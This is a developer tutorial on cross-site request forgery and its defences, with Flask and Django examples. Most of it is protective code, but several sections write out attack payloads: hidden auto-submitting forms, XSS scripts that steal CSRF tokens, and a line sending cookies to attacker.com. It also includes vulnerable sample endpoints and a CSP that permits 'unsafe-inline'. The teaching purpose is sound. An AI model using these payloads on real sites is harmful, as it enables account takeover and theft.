# Cross-Site Request Forgery (CSRF) Protection

## Table of Contents
1. [Overview](#overview)
2. [What is CSRF](#what-is-csrf)
3. [CSRF vs XSS](#csrf-vs-xss)
4. [How CSRF Attacks Work](#how-csrf-attacks-work)
5. [CSRF Attack Risks](#csrf-attack-risks)
6. [Anti-CSRF Tokens](#anti-csrf-tokens)
7. [SameSite Cookie Attribute](#samesite-cookie-attribute)
8. [Referer and Origin Headers](#referer-and-origin-headers)
9. [State-Changing Operations](#state-changing-operations)
10. [HTTP GET vs POST](#http-get-vs-post)
11. [User Confirmation and Re-authentication](#user-confirmation-and-re-authentication)
12. [Combined XSS and CSRF Attacks](#combined-xss-and-csrf-attacks)
13. [CSRF Prevention Strategies](#csrf-prevention-strategies)
14. [Implementation Examples](#implementation-examples)
15. [Best Practices](#best-practices)
16. [Testing for CSRF](#testing-for-csrf)

## Overview

Cross-Site Request Forgery (CSRF) is a type of attack that tricks a user into performing unwanted actions on a web application in which they are currently authenticated. CSRF attacks exploit the trust that a web application has in the user's browser.

## What is CSRF

### Definition
CSRF is a security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It works by exploiting the fact that web browsers automatically include cookies and other authentication credentials in requests to the same domain.

### Key Characteristics
- **Exploits user authentication**: Relies on the user being logged in
- **Cross-site nature**: Attack originates from a different domain
- **Unintended actions**: User performs actions without explicit consent
- **Browser behavior**: Leverages automatic cookie inclusion
- **State-changing operations**: Targets operations that modify data

### CSRF Attack Vector
```
1. User is authenticated on vulnerable-site.com
2. User visits malicious-site.com
3. Malicious site sends request to vulnerable-site.com
4. Browser automatically includes authentication cookies
5. Vulnerable site processes request as if user intended it
```

## CSRF vs XSS

### Key Differences

| Aspect | CSRF | XSS |
|--------|------|-----|
| **Attack Vector** | Cross-site requests | Injected scripts |
| **Target** | User's actions | User's data/session |
| **Execution** | Server-side | Client-side |
| **User Interaction** | Unintended actions | Data theft/manipulation |
| **Prevention** | CSRF tokens, SameSite | Input validation, output encoding |
| **Scope** | State-changing operations | Any page content |

### CSRF (Cross-Site Request Forgery)
- **Purpose**: Force user to perform unintended actions
- **Method**: Send requests from malicious site to target site
- **Target**: State-changing operations (transfers, purchases, etc.)
- **User Impact**: Unwanted actions performed on their behalf

### XSS (Cross-Site Scripting)
- **Purpose**: Steal data or hijack user sessions
- **Method**: Inject malicious scripts into web pages
- **Target**: User's data, session tokens, cookies
- **User Impact**: Data theft, session hijacking, account takeover

### Example Comparison

**CSRF Attack:**
```html
<!-- Malicious site sends request to bank -->
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
    <input type="hidden" name="to" value="attacker-account">
    <input type="hidden" name="amount" value="1000">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

**XSS Attack:**
```html
<!-- Malicious script injected into vulnerable site -->
<script>
    // Steal user's session cookie
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

## How CSRF Attacks Work

### Step-by-Step Process

#### 1. **User Authentication**
```
User logs into vulnerable-site.com
Browser stores authentication cookies
User is now authenticated for future requests
```

#### 2. **Malicious Site Visit**
```
User visits malicious-site.com (via email, link, etc.)
Malicious site contains hidden forms or JavaScript
```

#### 3. **Request Generation**
```html
<!-- Hidden form on malicious site -->
<form action="https://vulnerable-site.com/transfer" method="POST" id="attack-form">
    <input type="hidden" name="recipient" value="attacker@evil.com">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="currency" value="USD">
</form>

<script>
    // Automatically submit form
    document.getElementById('attack-form').submit();
</script>
```

#### 4. **Browser Request**
```
Browser sends POST request to vulnerable-site.com
Browser automatically includes authentication cookies
Request appears legitimate to the server
```

#### 5. **Server Processing**
```
Server receives request with valid authentication
Server processes transfer as if user intended it
Money is transferred to attacker's account
```

### Real-World Example

#### Vulnerable Banking Application
```python
# Vulnerable endpoint
@app.route('/transfer', methods=['POST'])
def transfer_money():
    if 'user_id' in session:  # User is authenticated
        recipient = request.form['recipient']
        amount = request.form['amount']
        
        # Process transfer without CSRF protection
        process_transfer(session['user_id'], recipient, amount)
        return "Transfer successful"
    else:
        return "Not authenticated", 401
```

#### Malicious Site
```html
<!DOCTYPE html>
<html>
<head>
    <title>Free Money!</title>
</head>
<body>
    <h1>Click here for free money!</h1>
    
    <!-- Hidden CSRF attack -->
    <form action="https://bank.com/transfer" method="POST" id="csrf-attack" style="display:none;">
        <input type="hidden" name="recipient" value="attacker@evil.com">
        <input type="hidden" name="amount" value="5000">
    </form>
    
    <script>
        // Automatically submit when page loads
        window.onload = function() {
            document.getElementById('csrf-attack').submit();
        };
    </script>
</body>
</html>
```

## CSRF Attack Risks

### Financial Risks
- **Unauthorized transfers**: Money sent to attacker accounts
- **Purchase manipulation**: Unwanted purchases made
- **Account modifications**: Changes to payment methods
- **Subscription changes**: Unwanted service subscriptions

### Data Risks
- **Profile modifications**: Changes to user profiles
- **Privacy settings**: Exposure of private information
- **Contact information**: Changes to email/phone numbers
- **Password changes**: Account takeover attempts

### Operational Risks
- **Content creation**: Unwanted posts or comments
- **Administrative actions**: Unauthorized admin operations
- **System configuration**: Changes to system settings
- **User management**: Unauthorized user operations

### Example Attack Scenarios

#### 1. **E-commerce CSRF**
```html
<!-- Add expensive item to cart -->
<form action="https://shop.com/cart/add" method="POST">
    <input type="hidden" name="product_id" value="expensive-laptop">
    <input type="hidden" name="quantity" value="1">
</form>
```

#### 2. **Social Media CSRF**
```html
<!-- Post embarrassing content -->
<form action="https://social.com/posts" method="POST">
    <input type="hidden" name="content" value="I love spam!">
    <input type="hidden" name="privacy" value="public">
</form>
```

#### 3. **Email CSRF**
```html
<!-- Change email address -->
<form action="https://service.com/profile/email" method="POST">
    <input type="hidden" name="new_email" value="attacker@evil.com">
    <input type="hidden" name="confirm_email" value="attacker@evil.com">
</form>
```

## Anti-CSRF Tokens

### What are Anti-CSRF Tokens?

Anti-CSRF tokens are unique, unpredictable values that are included in forms and validated on the server to ensure that requests originate from legitimate sources.

### How Anti-CSRF Tokens Work

#### 1. **Token Generation**
```python
import secrets
import hashlib
from datetime import datetime

def generate_csrf_token(user_id):
    """Generate a unique CSRF token for a user"""
    # Combine user ID, timestamp, and random data
    timestamp = str(int(datetime.utcnow().timestamp()))
    random_data = secrets.token_hex(16)
    combined = f"{user_id}:{timestamp}:{random_data}"
    
    # Hash the combined data
    token = hashlib.sha256(combined.encode()).hexdigest()
    
    # Store token with expiration
    store_csrf_token(user_id, token, timestamp)
    
    return token
```

#### 2. **Token Inclusion in Forms**
```html
<!-- Include CSRF token in forms -->
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
    <input type="text" name="recipient" placeholder="Recipient">
    <input type="number" name="amount" placeholder="Amount">
    <button type="submit">Transfer</button>
</form>
```

#### 3. **Token Validation**
```python
def validate_csrf_token(user_id, submitted_token):
    """Validate CSRF token"""
    stored_token = get_csrf_token(user_id)
    
    if not stored_token:
        return False
    
    if not secrets.compare_digest(stored_token, submitted_token):
        return False
    
    # Check token expiration (e.g., 1 hour)
    if is_token_expired(user_id):
        return False
    
    return True

@app.route('/transfer', methods=['POST'])
def transfer_money():
    if 'user_id' not in session:
        return "Not authenticated", 401
    
    # Validate CSRF token
    csrf_token = request.form.get('csrf_token')
    if not validate_csrf_token(session['user_id'], csrf_token):
        return "Invalid CSRF token", 403
    
    # Process transfer
    recipient = request.form['recipient']
    amount = request.form['amount']
    process_transfer(session['user_id'], recipient, amount)
    
    return "Transfer successful"
```

### Token Storage Strategies

#### 1. **Server-Side Storage**
```python
# Store tokens in database or cache
csrf_tokens = {}

def store_csrf_token(user_id, token, timestamp):
    csrf_tokens[user_id] = {
        'token': token,
        'timestamp': timestamp,
        'expires_at': datetime.utcnow() + timedelta(hours=1)
    }

def get_csrf_token(user_id):
    if user_id in csrf_tokens:
        token_data = csrf_tokens[user_id]
        if datetime.utcnow() < token_data['expires_at']:
            return token_data['token']
        else:
            del csrf_tokens[user_id]
    return None
```

#### 2. **Session-Based Storage**
```python
def generate_session_csrf_token():
    """Generate CSRF token stored in session"""
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']

def validate_session_csrf_token(submitted_token):
    """Validate CSRF token from session"""
    stored_token = session.get('csrf_token')
    return stored_token and secrets.compare_digest(stored_token, submitted_token)
```

## SameSite Cookie Attribute

### What is SameSite?

SameSite is a cookie attribute that controls when cookies are sent with cross-site requests, providing protection against CSRF attacks.

### SameSite Values

#### 1. **Strict**
```python
# Cookies are never sent with cross-site requests
response.set_cookie(
    'session_id',
    session_id,
    samesite='Strict',
    secure=True,
    httponly=True
)
```

**Behavior:**
- Cookies only sent for same-site requests
- Maximum CSRF protection
- May break legitimate cross-site functionality

#### 2. **Lax**
```python
# Cookies sent with top-level navigation (GET requests)
response.set_cookie(
    'session_id',
    session_id,
    samesite='Lax',
    secure=True,
    httponly=True
)
```

**Behavior:**
- Cookies sent for same-site requests
- Cookies sent for top-level navigation (links, bookmarks)
- Cookies NOT sent for cross-site POST requests
- Good balance of security and functionality

#### 3. **None**
```python
# Cookies always sent (requires Secure flag)
response.set_cookie(
    'session_id',
    session_id,
    samesite='None',
    secure=True,
    httponly=True
)
```

**Behavior:**
- Cookies always sent with requests
- Requires Secure flag
- No CSRF protection
- Used for embedded content

### SameSite Implementation Example

```python
from flask import Flask, request, session, make_response

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    if validate_credentials(username, password):
        session['user_id'] = username
        
        # Set secure session cookie with SameSite
        response = make_response(redirect('/dashboard'))
        response.set_cookie(
            'session_id',
            session.sid,
            samesite='Lax',      # CSRF protection
            secure=True,         # HTTPS only
            httponly=True,       # No JavaScript access
            max_age=3600         # 1 hour expiration
        )
        
        return response
    else:
        return "Invalid credentials", 401

@app.route('/transfer', methods=['POST'])
def transfer_money():
    # SameSite=Lax prevents CSRF attacks on POST requests
    if 'user_id' not in session:
        return "Not authenticated", 401
    
    # Process transfer
    recipient = request.form['recipient']
    amount = request.form['amount']
    process_transfer(session['user_id'], recipient, amount)
    
    return "Transfer successful"
```

## Referer and Origin Headers

### How Headers Help in CSRF Mitigation

#### 1. **Referer Header**
The Referer header indicates the page that made the request, helping to identify the source of the request.

```python
def validate_referer():
    """Validate Referer header for CSRF protection"""
    referer = request.headers.get('Referer')
    
    if not referer:
        return False
    
    # Check if referer is from same origin
    expected_origin = request.url_root.rstrip('/')
    if not referer.startswith(expected_origin):
        return False
    
    return True

@app.route('/transfer', methods=['POST'])
def transfer_money():
    # Validate Referer header
    if not validate_referer():
        return "Invalid referer", 403
    
    # Process transfer
    return "Transfer successful"
```

#### 2. **Origin Header**
The Origin header indicates the origin of the request, providing more reliable CSRF protection.

```python
def validate_origin():
    """Validate Origin header for CSRF protection"""
    origin = request.headers.get('Origin')
    
    if not origin:
        return False
    
    # Check if origin matches expected domain
    expected_origin = request.url_root.rstrip('/')
    if origin != expected_origin:
        return False
    
    return True

@app.route('/transfer', methods=['POST'])
def transfer_money():
    # Validate Origin header
    if not validate_origin():
        return "Invalid origin", 403
    
    # Process transfer
    return "Transfer successful"
```

### Header Validation Implementation

```python
def csrf_protection_middleware():
    """Middleware for CSRF protection using headers"""
    if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
        # Check Origin header first
        origin = request.headers.get('Origin')
        if origin:
            expected_origin = request.url_root.rstrip('/')
            if origin != expected_origin:
                return "CSRF protection: Invalid origin", 403
        
        # Fallback to Referer header
        referer = request.headers.get('Referer')
        if referer:
            expected_origin = request.url_root.rstrip('/')
            if not referer.startswith(expected_origin):
                return "CSRF protection: Invalid referer", 403
        
        # If no Origin or Referer, require CSRF token
        if not origin and not referer:
            csrf_token = request.form.get('csrf_token')
            if not validate_csrf_token(session.get('user_id'), csrf_token):
                return "CSRF protection: Invalid token", 403
    
    return None  # No CSRF violation
```

## State-Changing Operations

### Why State-Changing Operations are Vulnerable

State-changing operations modify data or system state, making them prime targets for CSRF attacks:

1. **Financial Impact**: Money transfers, purchases
2. **Data Modification**: Profile changes, content creation
3. **Access Control**: Permission changes, user management
4. **System Configuration**: Settings changes, administrative actions

### Examples of State-Changing Operations

#### 1. **Financial Operations**
```python
# Vulnerable to CSRF
@app.route('/transfer', methods=['POST'])
def transfer_money():
    # Changes user's account balance
    pass

@app.route('/purchase', methods=['POST'])
def make_purchase():
    # Changes user's purchase history
    pass
```

#### 2. **Data Modification**
```python
# Vulnerable to CSRF
@app.route('/profile/update', methods=['POST'])
def update_profile():
    # Changes user's profile data
    pass

@app.route('/posts/create', methods=['POST'])
def create_post():
    # Creates new content
    pass
```

#### 3. **Access Control**
```python
# Vulnerable to CSRF
@app.route('/admin/users/delete', methods=['POST'])
def delete_user():
    # Changes system state
    pass

@app.route('/permissions/grant', methods=['POST'])
def grant_permission():
    # Changes user permissions
    pass
```

## HTTP GET vs POST

### Why State-Changing Operations Should Avoid GET

#### 1. **GET Request Vulnerabilities**
```html
<!-- CSRF attack using GET request -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" alt="Free money!">

<!-- Or using JavaScript -->
<script>
    fetch('https://bank.com/transfer?to=attacker&amount=1000');
</script>
```

#### 2. **Safe GET vs Unsafe GET**

**Safe GET (Read-only):**
```python
@app.route('/balance', methods=['GET'])
def get_balance():
    # Safe: Only reads data, doesn't modify
    return jsonify({'balance': get_user_balance(session['user_id'])})
```

**Unsafe GET (State-changing):**
```python
@app.route('/transfer', methods=['GET'])  # DANGEROUS!
def transfer_money():
    # Unsafe: Modifies data via GET request
    recipient = request.args.get('to')
    amount = request.args.get('amount')
    process_transfer(session['user_id'], recipient, amount)
    return "Transfer successful"
```

#### 3. **Proper HTTP Method Usage**
```python
# Correct: Use POST for state-changing operations
@app.route('/transfer', methods=['POST'])
def transfer_money():
    recipient = request.form['to']
    amount = request.form['amount']
    process_transfer(session['user_id'], recipient, amount)
    return "Transfer successful"

# Correct: Use GET for read-only operations
@app.route('/transactions', methods=['GET'])
def get_transactions():
    return jsonify(get_user_transactions(session['user_id']))
```

### HTTP Method Security Guidelines

| Method | Purpose | CSRF Risk | Usage |
|--------|---------|-----------|-------|
| **GET** | Retrieve data | Low (if read-only) | Safe for queries |
| **POST** | Create data | High | Use for state changes |
| **PUT** | Update data | High | Use for updates |
| **DELETE** | Remove data | High | Use for deletions |
| **PATCH** | Partial update | High | Use for partial updates |

## User Confirmation and Re-authentication

### How Confirmation Helps

User confirmation and re-authentication add an extra layer of security by requiring explicit user consent for sensitive operations.

#### 1. **Confirmation Dialogs**
```javascript
// Client-side confirmation
function confirmTransfer() {
    const recipient = document.getElementById('recipient').value;
    const amount = document.getElementById('amount').value;
    
    const confirmed = confirm(
        `Are you sure you want to transfer $${amount} to ${recipient}?`
    );
    
    if (confirmed) {
        document.getElementById('transfer-form').submit();
    }
}
```

#### 2. **Re-authentication**
```python
@app.route('/transfer', methods=['POST'])
def transfer_money():
    if 'user_id' not in session:
        return "Not authenticated", 401
    
    # Check if user needs to re-authenticate
    if not session.get('recently_authenticated'):
        return redirect('/re-authenticate?next=/transfer')
    
    # Process transfer
    recipient = request.form['recipient']
    amount = request.form['amount']
    process_transfer(session['user_id'], recipient, amount)
    
    return "Transfer successful"

@app.route('/re-authenticate', methods=['GET', 'POST'])
def re_authenticate():
    if request.method == 'POST':
        password = request.form['password']
        user_id = session['user_id']
        
        if validate_password(user_id, password):
            session['recently_authenticated'] = True
            session['auth_time'] = datetime.utcnow()
            
            next_url = request.args.get('next', '/dashboard')
            return redirect(next_url)
        else:
            return "Invalid password", 401
    
    return '''
    <form method="post">
        <h2>Re-authentication Required</h2>
        <p>Please enter your password to continue:</p>
        <input type="password" name="password" required>
        <button type="submit">Continue</button>
    </form>
    '''
```

#### 3. **Time-Based Re-authentication**
```python
def require_recent_auth(max_age_minutes=15):
    """Decorator to require recent authentication"""
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if 'user_id' not in session:
                return redirect('/login')
            
            auth_time = session.get('auth_time')
            if not auth_time:
                return redirect('/re-authenticate')
            
            # Check if authentication is recent enough
            auth_datetime = datetime.fromisoformat(auth_time)
            if datetime.utcnow() - auth_datetime > timedelta(minutes=max_age_minutes):
                return redirect('/re-authenticate')
            
            return f(*args, **kwargs)
        return decorated_function
    return decorator

@app.route('/transfer', methods=['POST'])
@require_recent_auth(max_age_minutes=5)  # Require auth within 5 minutes
def transfer_money():
    # Process transfer
    return "Transfer successful"
```

## Combined XSS and CSRF Attacks

### How XSS Enables CSRF

XSS can be used to bypass CSRF protections by executing malicious JavaScript within the target application.

#### 1. **XSS to Bypass CSRF Tokens**
```html
<!-- XSS payload that steals CSRF token and performs CSRF attack -->
<script>
    // Steal CSRF token from form
    const csrfToken = document.querySelector('input[name="csrf_token"]').value;
    
    // Perform CSRF attack with stolen token
    fetch('/transfer', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `csrf_token=${csrfToken}&recipient=attacker@evil.com&amount=1000`
    });
</script>
```

#### 2. **XSS to Modify Forms**
```html
<!-- XSS payload that modifies form action -->
<script>
    // Change form action to attacker's site
    document.querySelector('form').action = 'https://attacker.com/steal-data';
    
    // Or modify form data
    document.querySelector('input[name="amount"]').value = '999999';
</script>
```

#### 3. **XSS to Bypass SameSite Cookies**
```html
<!-- XSS payload that bypasses SameSite protection -->
<script>
    // Since XSS runs in same origin, SameSite cookies are included
    fetch('/admin/delete-user', {
        method: 'POST',
        body: 'user_id=victim'
    });
</script>
```

### Combined Attack Example

#### 1. **XSS Vulnerability**
```python
# Vulnerable endpoint that reflects user input
@app.route('/search')
def search():
    query = request.args.get('q', '')
    # Vulnerable: No output encoding
    return f"<h1>Search results for: {query}</h1>"
```

#### 2. **XSS Payload**
```html
<!-- Malicious search query -->
https://vulnerable-site.com/search?q=<script>
    // Steal CSRF token
    const token = document.querySelector('input[name="csrf_token"]').value;
    
    // Perform CSRF attack
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = '/transfer';
    
    const tokenInput = document.createElement('input');
    tokenInput.name = 'csrf_token';
    tokenInput.value = token;
    
    const recipientInput = document.createElement('input');
    recipientInput.name = 'recipient';
    recipientInput.value = 'attacker@evil.com';
    
    const amountInput = document.createElement('input');
    amountInput.name = 'amount';
    amountInput.value = '5000';
    
    form.appendChild(tokenInput);
    form.appendChild(recipientInput);
    form.appendChild(amountInput);
    
    document.body.appendChild(form);
    form.submit();
</script>
```

### Prevention Against Combined Attacks

#### 1. **Content Security Policy (CSP)**
```python
@app.after_request
def add_csp_header(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "connect-src 'self';"
    )
    return response
```

#### 2. **Input Validation and Output Encoding**
```python
import html

@app.route('/search')
def search():
    query = request.args.get('q', '')
    
    # Validate input
    if len(query) > 100:
        return "Query too long", 400
    
    # Encode output
    safe_query = html.escape(query)
    return f"<h1>Search results for: {safe_query}</h1>"
```

#### 3. **Additional CSRF Protections**
```python
# Use multiple CSRF protection methods
@app.route('/transfer', methods=['POST'])
def transfer_money():
    # 1. Validate CSRF token
    csrf_token = request.form.get('csrf_token')
    if not validate_csrf_token(session.get('user_id'), csrf_token):
        return "Invalid CSRF token", 403
    
    # 2. Validate Origin header
    if not validate_origin():
        return "Invalid origin", 403
    
    # 3. Require re-authentication for sensitive operations
    if not session.get('recently_authenticated'):
        return redirect('/re-authenticate')
    
    # Process transfer
    return "Transfer successful"
```

## CSRF Prevention Strategies

### 1. **Multi-Layer Defense**
```python
def csrf_protection_middleware():
    """Comprehensive CSRF protection"""
    if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
        # Layer 1: CSRF Token
        csrf_token = request.form.get('csrf_token')
        if not validate_csrf_token(session.get('user_id'), csrf_token):
            return "CSRF protection: Invalid token", 403
        
        # Layer 2: Origin Header
        if not validate_origin():
            return "CSRF protection: Invalid origin", 403
        
        # Layer 3: Referer Header
        if not validate_referer():
            return "CSRF protection: Invalid referer", 403
    
    return None
```

### 2. **SameSite Cookies**
```python
# Set SameSite=Lax for session cookies
response.set_cookie(
    'session_id',
    session_id,
    samesite='Lax',
    secure=True,
    httponly=True
)
```

### 3. **Double Submit Cookies**
```python
def generate_double_submit_token():
    """Generate token for double submit cookie pattern"""
    token = secrets.token_hex(32)
    
    # Set cookie
    response = make_response()
    response.set_cookie(
        'csrf_token',
        token,
        samesite='Strict',
        secure=True,
        httponly=False  # Allow JavaScript access
    )
    
    return token, response

def validate_double_submit_token():
    """Validate double submit cookie token"""
    cookie_token = request.cookies.get('csrf_token')
    form_token = request.form.get('csrf_token')
    
    return cookie_token and form_token and secrets.compare_digest(cookie_token, form_token)
```

## Implementation Examples

### Flask CSRF Protection
```python
from flask import Flask, request, session, render_template_string
from functools import wraps
import secrets

app = Flask(__name__)
app.secret_key = 'your-secret-key'

# CSRF token storage
csrf_tokens = {}

def generate_csrf_token():
    """Generate CSRF token"""
    token = secrets.token_hex(32)
    session['csrf_token'] = token
    return token

def validate_csrf_token():
    """Validate CSRF token"""
    token = request.form.get('csrf_token')
    return token and secrets.compare_digest(token, session.get('csrf_token', ''))

def csrf_protect(f):
    """CSRF protection decorator"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
            if not validate_csrf_token():
                return "CSRF protection: Invalid token", 403
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def index():
    token = generate_csrf_token()
    return render_template_string('''
        <h1>CSRF Protected Form</h1>
        <form method="post" action="/transfer">
            <input type="hidden" name="csrf_token" value="{{ token }}">
            <input type="text" name="recipient" placeholder="Recipient" required>
            <input type="number" name="amount" placeholder="Amount" required>
            <button type="submit">Transfer</button>
        </form>
    ''', token=token)

@app.route('/transfer', methods=['POST'])
@csrf_protect
def transfer():
    recipient = request.form['recipient']
    amount = request.form['amount']
    return f"Transfer of ${amount} to {recipient} successful!"
```

### Django CSRF Protection
```python
# Django automatically includes CSRF protection
from django.shortcuts import render
from django.views.decorators.csrf import csrf_protect
from django.middleware.csrf import get_token

@csrf_protect
def transfer_view(request):
    if request.method == 'POST':
        # CSRF token is automatically validated
        recipient = request.POST['recipient']
        amount = request.POST['amount']
        return HttpResponse(f"Transfer of ${amount} to {recipient} successful!")
    
    # Include CSRF token in template
    context = {'csrf_token': get_token(request)}
    return render(request, 'transfer.html', context)
```

## Best Practices

### 1. **Use Multiple Protection Methods**
- CSRF tokens
- SameSite cookies
- Origin/Referer validation
- Re-authentication for sensitive operations

### 2. **Implement Proper Token Management**
- Generate cryptographically secure tokens
- Store tokens securely
- Implement token expiration
- Regenerate tokens after use

### 3. **Follow HTTP Method Guidelines**
- Use GET for read-only operations
- Use POST/PUT/DELETE for state-changing operations
- Never use GET for sensitive operations

### 4. **Secure Cookie Configuration**
```python
response.set_cookie(
    'session_id',
    session_id,
    samesite='Lax',      # CSRF protection
    secure=True,         # HTTPS only
    httponly=True,       # No JavaScript access
    max_age=3600         # Expiration
)
```

### 5. **Regular Security Testing**
- Test for CSRF vulnerabilities
- Validate protection mechanisms
- Monitor for bypass attempts
- Keep protection methods updated

## Testing for CSRF

### 1. **Manual Testing**
```html
<!-- Test CSRF protection -->
<form action="https://target-site.com/transfer" method="POST">
    <input type="hidden" name="recipient" value="test@example.com">
    <input type="hidden" name="amount" value="1">
    <button type="submit">Test CSRF</button>
</form>
```

### 2. **Automated Testing**
```python
import requests

def test_csrf_protection():
    """Test CSRF protection"""
    # Get session
    session = requests.Session()
    session.get('https://target-site.com/login')
    
    # Try CSRF attack
    response = session.post('https://target-site.com/transfer', data={
        'recipient': 'test@example.com',
        'amount': '1'
    })
    
    # Check if attack was blocked
    if response.status_code == 403:
        print("CSRF protection working")
    else:
        print("CSRF protection failed")
```

### 3. **Security Headers Testing**
```python
def test_security_headers():
    """Test security headers"""
    response = requests.get('https://target-site.com')
    
    # Check for security headers
    headers = response.headers
    
    if 'Content-Security-Policy' in headers:
        print("CSP header present")
    
    if 'X-Frame-Options' in headers:
        print("X-Frame-Options header present")
    
    if 'X-Content-Type-Options' in headers:
        print("X-Content-Type-Options header present")
```

---

## Conclusion

CSRF attacks exploit the trust between web applications and users' browsers. By implementing multiple layers of protection including CSRF tokens, SameSite cookies, proper HTTP methods, and user confirmation, developers can effectively prevent CSRF attacks.

**Key takeaways:**
- CSRF attacks force users to perform unintended actions
- Multiple protection methods should be used together
- State-changing operations are most vulnerable
- XSS can be combined with CSRF for more sophisticated attacks
- Regular testing and monitoring are essential
- Follow security best practices and keep protections updated
